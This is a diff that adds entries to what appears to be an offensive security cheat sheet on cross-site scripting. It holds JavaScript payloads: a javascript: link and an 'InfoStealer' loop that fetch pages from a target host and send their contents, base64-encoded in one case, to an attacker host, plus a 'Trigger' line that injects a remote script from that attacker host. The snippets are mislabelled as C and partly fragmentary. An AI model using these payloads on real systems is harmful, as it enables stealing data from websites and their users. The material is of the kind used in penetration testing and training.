@@ -4727,6 +4727,31 @@ xmlhttp.send(null);
 <a href="javascript:fetch('http://<RHOST>/<FILE>').then(r=>r.text()).then(d=>fetch('http://<LHOST>/?response='+encodeURIComponent(d))).catch(e=>console.error('Error:',e));"><COMMENT></a>
 ```
 
+#### InfoStealer
+
+```c
+for (let uid = 1; uid <= 15; uid++) {
+  fetch(`http://<RHOST>/`)
+    .then(r => r.text())
+    .then(t => {
+      fetch('http://<LHOST>?data=' + btoa(t));
+    })
+    .catch(err => {
+      console.error('Error:', err);
+      // If there's an error, make a request to http://<LHOST>/error
+      fetch('http://<LHOST>/error');
+    });
+}
+```
+
+#### Trigger
+
+```c
+document.body.appendChild(Object.assign(document.createElement('script'),{src:'http://<LHOST>/<FILE>.js'})) foo=bar">
+  Foo
+</body>&content=html&recipient=<EMAIL>
+```
+
 #### XSS Client-Side Attack Examples
 
 ##### Request Example
